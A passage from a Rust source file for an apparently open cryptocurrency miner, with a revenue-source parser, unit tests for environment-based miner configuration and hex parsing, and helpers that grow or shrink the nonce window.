            .with_context(|| format!("invalid hex byte '{pair}' in {key}"))?;
    }
    Ok(DifficultyTarget { bytes })
}

fn parse_revenue_source(value: &str) -> Result<RevenueSource> {
    match value.trim().to_ascii_lowercase().as_str() {
        "zion" => Ok(RevenueSource::Zion),
        "keccak" | "keccak_bonus" => Ok(RevenueSource::KeccakBonus),
        "sha3" | "sha3_bonus" => Ok(RevenueSource::Sha3Bonus),
        "profit" | "profit_switch" => Ok(RevenueSource::ProfitSwitch),
        "blake3" | "blake3_external" | "dcr" | "alph" => Ok(RevenueSource::Blake3External),
        "ncl" | "ncl_ai" => Ok(RevenueSource::NclAi),
        other => Err(anyhow!("unsupported revenue source: {other}")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn revenue_source_parser_accepts_aliases() {
        assert!(matches!(parse_revenue_source("zion"), Ok(RevenueSource::Zion)));
        assert!(matches!(
            parse_revenue_source("profit_switch"),
            Ok(RevenueSource::ProfitSwitch)
        ));
        assert!(matches!(parse_revenue_source("ncl"), Ok(RevenueSource::NclAi)));
        assert!(matches!(parse_revenue_source("dcr"), Ok(RevenueSource::Blake3External)));
        assert!(matches!(parse_revenue_source("alph"), Ok(RevenueSource::Blake3External)));
        assert!(matches!(parse_revenue_source("blake3_external"), Ok(RevenueSource::Blake3External)));
    }

    #[test]
    fn target_parser_accepts_64_hex_chars() {
        std::env::set_var(
            "ZION_TARGET",
            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
        );
        let target = parse_target_env("ZION_TARGET").expect("valid target hex");
        assert_eq!(target, DifficultyTarget::MAX);
        std::env::remove_var("ZION_TARGET");
    }

    #[test]
    fn miner_config_reads_loop_and_ttl() {
        std::env::set_var("ZION_LOOP_COUNT", "3");
        std::env::set_var("ZION_JOB_TTL_MS", "2500");
        std::env::set_var("ZION_NONCE_STRIDE", "4096");
        std::env::set_var("ZION_NONCE_AUTOTUNE", "true");
        std::env::set_var("ZION_NONCE_COUNT_MIN", "2000");
        std::env::set_var("ZION_NONCE_COUNT_MAX", "2000000");
        std::env::set_var("ZION_NONCE_ADJUST_PCT", "30");
        std::env::set_var("ZION_REMOTE_TTL_GUARD_PCT", "85");
        std::env::set_var("ZION_METRICS_REPORT_SECS", "12");
        let config = MinerConfig::from_env().expect("config from env");
        assert_eq!(config.loop_count, 3);
        assert_eq!(config.job_ttl_ms, 2500);
        assert_eq!(config.nonce_stride, 4096);
        assert!(config.nonce_autotune);
        assert_eq!(config.nonce_count_min, 2000);
        assert_eq!(config.nonce_count_max, 2_000_000);
        assert_eq!(config.nonce_adjust_percent, 30);
        assert_eq!(config.remote_ttl_guard_percent, 85);
        assert_eq!(config.metrics_report_every_secs, 12);
        std::env::remove_var("ZION_LOOP_COUNT");
        std::env::remove_var("ZION_JOB_TTL_MS");
        std::env::remove_var("ZION_NONCE_STRIDE");
        std::env::remove_var("ZION_NONCE_AUTOTUNE");
        std::env::remove_var("ZION_NONCE_COUNT_MIN");
        std::env::remove_var("ZION_NONCE_COUNT_MAX");
        std::env::remove_var("ZION_NONCE_ADJUST_PCT");
        std::env::remove_var("ZION_REMOTE_TTL_GUARD_PCT");
        std::env::remove_var("ZION_METRICS_REPORT_SECS");
    }

    #[test]
    fn miner_config_reads_pool_addr() {
        std::env::set_var("ZION_POOL_ADDR", "127.0.0.1:8444");
        let config = MinerConfig::from_env().expect("config from env");
        assert_eq!(config.pool_addr.as_deref(), Some("127.0.0.1:8444"));
        std::env::remove_var("ZION_POOL_ADDR");
    }

    // ── parse_fixed_hex ──

    #[test]
    fn parse_fixed_hex_rejects_wrong_length() {
        let result = parse_fixed_hex::<32>("aabb", "test");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("64 hex chars"));
    }

    #[test]
    fn parse_fixed_hex_rejects_invalid_hex_chars() {
        let input = "zz".repeat(32);
        let result = parse_fixed_hex::<32>(&input, "test");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("invalid hex byte"));
    }

    #[test]
    fn parse_fixed_hex_strips_0x_prefix() {
        let input = format!("0x{}", "aa".repeat(32));
        let result = parse_fixed_hex::<32>(&input, "test");
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), [0xaa; 32]);
    }

    #[test]
    fn parse_fixed_hex_trims_whitespace() {
        let input = format!("  {} ", "bb".repeat(32));
        let result = parse_fixed_hex::<32>(&input, "test");
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), [0xbb; 32]);
    }

    // ── parse_header_hex ──

    #[test]
    fn parse_header_hex_valid_80_bytes() {
        let hex_str = "aa".repeat(80);
        let header = parse_header_hex(&hex_str).expect("valid 80-byte header");
        assert_eq!(header.version, u32::from_le_bytes([0xaa; 4]));
    }

    #[test]
    fn parse_header_hex_rejects_short_input() {
        let result = parse_header_hex("aabb");
        assert!(result.is_err());
    }

    // ── parse_bool_env ──

    #[test]
    fn parse_bool_env_falsy_values() {
        for val in ["0", "false", "no", "off", "FALSE", "Off"] {
            std::env::set_var("ZION_TEST_BOOL_F", val);
            assert!(!parse_bool_env("ZION_TEST_BOOL_F", true), "'{val}' should be falsy");
        }
        std::env::remove_var("ZION_TEST_BOOL_F");
    }

    #[test]
    fn parse_bool_env_truthy_values() {
        for val in ["1", "true", "yes", "on", "TRUE", "anything"] {
            std::env::set_var("ZION_TEST_BOOL_T", val);
            assert!(parse_bool_env("ZION_TEST_BOOL_T", false), "'{val}' should be truthy");
        }
        std::env::remove_var("ZION_TEST_BOOL_T");
    }

    #[test]
    fn parse_bool_env_returns_default_when_missing() {
        std::env::remove_var("ZION_TEST_BOOL_MISSING");
        assert!(parse_bool_env("ZION_TEST_BOOL_MISSING", true));
        assert!(!parse_bool_env("ZION_TEST_BOOL_MISSING", false));
    }

    // ── nonce window autotune ──

    #[test]
    fn increase_nonce_window_grows_by_percent() {
        assert_eq!(increase_nonce_window(1000, 5_000_000, 50), 1500);
    }

    #[test]
    fn increase_nonce_window_caps_at_max() {
        assert_eq!(increase_nonce_window(5_000_000, 5_000_000, 50), 5_000_000);
    }

    #[test]
    fn increase_nonce_window_always_grows_at_least_one() {
        assert!(increase_nonce_window(1, 100, 1) > 1);
    }

    #[test]
    fn decrease_nonce_window_shrinks_by_percent() {
        assert_eq!(decrease_nonce_window(1000, 100, 50), 500);
    }

    #[test]
    fn decrease_nonce_window_floors_at_min() {
        assert_eq!(decrease_nonce_window(100, 100, 50), 100);
        assert_eq!(decrease_nonce_window(50, 100, 50), 100);
    }

    // ── HashrateWindow ──

    #[test]
    fn hashrate_window_empty_returns_zero() {
        let window = HashrateWindow::new(10);
        assert_eq!(window.rate_hps(), 0.0);
    }

    #[test]
    fn hashrate_window_single_sample_returns_zero() {
        let mut window = HashrateWindow::new(10);
        window.push_total_hashes(Instant::now(), 1000);
        assert_eq!(window.rate_hps(), 0.0);
    }

    // ── SessionTelemetry ──

    #[test]
    fn session_telemetry_records_submit_latency() {
        let mut telemetry = SessionTelemetry::new(30);
        telemetry.record_submit_latency(Duration::from_millis(10));
        telemetry.record_submit_latency(Duration::from_millis(30));
        assert_eq!(telemetry.submit_samples, 2);
        assert_eq!(telemetry.submit_max_latency_ms, 30);
        let avg = telemetry.submit_avg_latency_ms();
        assert!((avg - 20.0).abs() < 1.0);
    }

    // ── revenue source ──

    #[test]
    fn revenue_source_rejects_unknown() {
        assert!(parse_revenue_source("unknown_source").is_err());
    }

    // ── target parser edge cases ──

    #[test]
    fn target_parser_rejects_short_hex() {
        std::env::set_var("ZION_TARGET_SHORT_TEST", "aabb");
        let result = parse_target_env("ZION_TARGET_SHORT_TEST");
        assert!(result.is_err());
        std::env::remove_var("ZION_TARGET_SHORT_TEST");
    }

    #[test]
    fn target_parser_strips_0x_prefix() {
        let hex64 = "ff".repeat(32);
        std::env::set_var("ZION_TARGET_0X_TEST", format!("0x{hex64}"));
        let target = parse_target_env("ZION_TARGET_0X_TEST").expect("valid 0x-prefixed target");
        assert_eq!(target, DifficultyTarget::MAX);
        std::env::remove_var("ZION_TARGET_0X_TEST");
    }
}

fn parse_bool_env(key: &str, default: bool) -> bool {
    match std::env::var(key) {
        Ok(v) => {
            let t = v.trim().to_ascii_lowercase();
            !(t == "0" || t == "false" || t == "no" || t == "off")
        }
        Err(_) => default,
    }
}

fn increase_nonce_window(current: u64, max: u64, adjust_percent: u64) -> u64 {
    if current >= max {
        return max;
    }
    let factor = 100u64.saturating_add(adjust_percent.max(1));
    let grown = current
        .saturating_mul(factor)
        .saturating_div(100)
        .max(current.saturating_add(1));
    grown.min(max)
}

fn decrease_nonce_window(current: u64, min: u64, adjust_percent: u64) -> u64 {
    if current <= min {
        return min;
    }
    let factor = 100u64.saturating_sub(adjust_percent.min(90)).max(10);
    let shrunk = current.saturating_mul(factor).saturating_div(100);
    shrunk.max(min)
}